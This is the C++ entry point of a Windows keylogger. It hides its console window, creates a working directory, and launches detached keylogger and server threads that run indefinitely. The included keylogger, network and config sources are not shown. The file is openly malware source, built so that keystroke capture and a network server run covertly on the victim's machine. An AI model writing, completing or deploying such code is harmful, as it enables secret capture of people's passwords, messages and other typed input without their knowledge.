#include "src/utils.h"
#include "src/keylogger.h"
#include "src/network.h"
#include "src/config.h"

#include <windows.h>
#include <thread>

int main() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    CreateDirectoryW((Config::BASE_DIR).c_str(), NULL);

    LogToFile("Starting keylogger and server threads");
    std::thread keyLoggerThread(KeyLogger);
    std::thread serverThread(ServerThread);

    keyLoggerThread.detach();
    serverThread.detach();

    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }

    return 0;
}